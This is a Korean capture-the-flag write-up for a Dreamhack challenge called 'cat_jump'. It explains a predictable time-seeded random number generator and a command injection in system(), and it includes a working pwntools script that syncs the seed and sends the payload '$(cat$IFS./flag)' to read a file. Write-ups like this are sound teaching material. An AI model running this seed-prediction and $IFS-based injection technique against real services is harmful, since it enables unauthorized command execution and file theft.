## 풀이

### 분석

1. 난수 생성 구조 (time(NULL) 기반 시드)
   - 게임 시작 시 srand(time(NULL));을 통해 난수 시드를 초기화합니다.
   - 초 단위의 서버 시간과 클라이언트 시간을 맞추면 동일한 난수 수열을 생성하여 장애물 위치를 100% 예측할 수 있습니다.
   - 1회 루프당 rand() 함수가 총 두 번 호출됩니다.
     - 첫 번째 rand(): 장애물 위치 결정 (rand() % 2)
     - 두 번째 rand(): 캣닙 출현 확률 계산 ((double)rand() / RAND_MAX)
   - 37번(CAT_JUMP_GOAL) 성공적으로 점프를 완료해야 단계가 종료됩니다.

2. 고양이 이름 입력 및 명령어 실행 구조
   - 37번 점프 성공 후 고양이 이름을 입력받습니다.
   - 입력받은 이름은 아래 코드를 통해 시스템 명령어로 실행됩니다.

### 취약점

1. 예측 가능한 PRNG
   - time(NULL)을 시드로 사용하는 srand()는 실행 시점의 타임스탬프를 알 수 있다면 다음 생성될 모든 난수를 완벽하게 예측할 수 있습니다.

2. Command Injection
   - 사용자 입력값(cat_name)이 검증 없이 system() 함수의 인자로 전달되므로, 백틱이나 $() 문법을 통해 추가 명령어를 실행시킬 수 있습니다.

3. 공백우회 제약조건
- scanf은 띄어쓰기를 만나면 문자열 입력을 종료합니다.
- 따라서 명령어 인자 구분용 공백 대신 셸 환경 변수인 $IFS를 활용해야 합니다.

### 익스플로잇

1. Python의 ctypes 모듈을 이용해 C 라이브러리(libc.so.6)의 srand 및 rand 함수를 로드합니다.
2. 서버 접속 직후 libc.srand(libc.time(0))을 호출하여 서버와 동일한 난수 시드를 설정합니다.
3. 37회 동안 장애물 난수(rand() % 2)를 계산하여 올바른 입력(l 또는 h)을 전송하고 캣닙 난수는 버려 루프 상태를 맞춥니다.
4. scanf 공백 제한을 우회하는 페이로드 cat$IFS./flag 를 전송하여 플래그 파일 내용을 출력시킵니다.

```python
from pwn import *
from ctypes import CDLL
from ctypes.util import find_library

# p = process("./cat_jump")
p = remote("host3.dreamhack.games", 8952)

libc = CDLL(find_library('c'))
libc.srand(libc.time(0x0))

for i in range(37):
    obstacle = libc.rand() % 2
    print("i : "+str(i)+", obstacle : "+str(obstacle))
    if obstacle==0:
        p.sendlineafter("jump='j': ", "l")
    else:
        p.sendlineafter("jump='j': ", "h")
    print(p.recvline())
    libc.rand() # for catnip

p.sendlineafter('\xf0\x9f\x98\xbc: ', "$(cat$IFS./flag)")

p.interactive()
```

## 배운 점

시간 기반 난수 생성의 위험성: 보안이 요구되는 로직에 time(NULL) 기반의 PRNG를 사용할 경우 공격자가 시드를 복제하여 모든 난수를 예측할 수 있음을 확인했습니다. 
system() 함수 사용 시 인자 검증의 중요성: 외부 입력을 system() 명령어로 전달할 때는 인젝션 공격 방지를 위한 필터링이나 안전한 API 사용이 필수적입니다.
입력 제약조건 우회 기법: scanf처럼 공백을 기준으로 입력을 자르는 환경에서도 $IFS와 같은 셸 환경 변수를 이용해 명령어 인자를 분리하는 우회 방식을 익혔습니다.
